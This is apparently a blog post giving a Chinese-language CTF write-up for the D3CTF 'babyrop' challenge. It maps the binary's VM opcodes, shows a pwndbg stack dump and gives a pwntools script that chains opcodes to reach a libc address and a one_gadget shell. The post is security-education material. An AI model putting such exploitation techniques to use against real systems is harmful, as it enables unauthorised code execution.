---
layout: post
title:  "D3CTF-Writeup"
date:   2019-12-1
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# D3CTF-Writeup

 

## babyrop

VM指令逆向，rop

```
0x28:pop;rsp指针下移0x80
0x15:push;rsp指针上移0x8
0x38:mov [rsp+8],0
0x56:mov [rsp],int
0x34:mov [rsp-8],[rsp]
0x21:add [rsp-8],[rsp]
```

bss上有简单栈结构

```
rsp
rbp
len
```

两次0x28

```
pwndbg> stack
00:0000│ rsp  0x7ffffffee4a8 —▸ 0x8001299 ◂— test   eax, eax
01:0008│      0x7ffffffee4b0 —▸ 0x8202148 (__bss_start+312) ◂— 0x2
02:0010│      0x7ffffffee4b8 —▸ 0x8202150 (__bss_start+320) —▸ 0x7ffffffee570 ◂— 0x1ff625ca0
03:0018│      0x7ffffffee4c0 —▸ 0x8202140 (__bss_start+304) ◂— 0x3
04:0020│      0x7ffffffee4c8 —▸ 0x8202040 (__bss_start+48) ◂— 0x282828 /* '(((' */
05:0028│      0x7ffffffee4d0 ◂— 0x0
... ↓
pwndbg> 
08:0040│   0x7ffffffee4e8 ◂— 0x0
... ↓
0f:0078│   0x7ffffffee520 ◂— 0x100000003
pwndbg> 
10:0080│      0x7ffffffee528 ◂— 0x3edcdea18f298900
11:0088│ rbp  0x7ffffffee530 —▸ 0x7ffffffee550 —▸ 0x8001430 ◂— push   r15
12:0090│      0x7ffffffee538 —▸ 0x8000977 ◂— 0xfe4fe800000000bf
13:0098│      0x7ffffffee540 —▸ 0x7ffffffee630 ◂— 0x1
14:00a0│      0x7ffffffee548 ◂— 0x3edcdea18f298900
15:00a8│      0x7ffffffee550 —▸ 0x8001430 ◂— push   r15
16:00b0│      0x7ffffffee558 —▸ 0x7fffff050830 (__libc_start_main+240) ◂— mov    edi, eax
17:00b8│      0x7ffffffee560 ◂— 0x1
pwndbg> 
18:00c0│   0x7ffffffee568 —▸ 0x7ffffffee638 —▸ 0x7ffffffee84f ◂— '/mnt/c/Users/wdbbw/Desktop/babyrop/babyrop'
19:00c8│   0x7ffffffee570 ◂— 0x1ff625ca0
1a:00d0│   0x7ffffffee578 —▸ 0x8000910 ◂— push   rbp /* 0x10ec8348e5894855 */
1b:00d8│   0x7ffffffee580 ◂— 0x0
1c:00e0│   0x7ffffffee588 ◂— 0x8708be57b6a66c07
1d:00e8│   0x7ffffffee590 —▸ 0x80007e0 ◂— 0x89485ed18949ed31
1e:00f0│   0x7ffffffee598 —▸ 0x7ffffffee630 ◂— 0x1
1f:00f8│   0x7ffffffee5a0 ◂— 0x0
```

在用0x15，可以摸到\_\_libc_start_main+240，然后凑one_gadget

```python
from pwn import *
r = process('./babyrop')

payload =  chr(0x28)                 #pop
payload += chr(0x15) + p64(0)        #push
payload += chr(0x28)                 #pop
payload += chr(0x38)                 #mov [rsp+8],0
payload += chr(0x56) + p32(0x24a3a)  #mov [rsp],0x24a3a
payload += chr(0X34)                 #mov [rsp-8],[rsp]   rsp -=8 
payload += chr(0x21)                 #add [rsp-8],[rsp]                          
payload += chr(0X34)*5               #mov [rsp-8],[rsp]   rsp -=8

r.sendline(payload)
r.interactive()
```

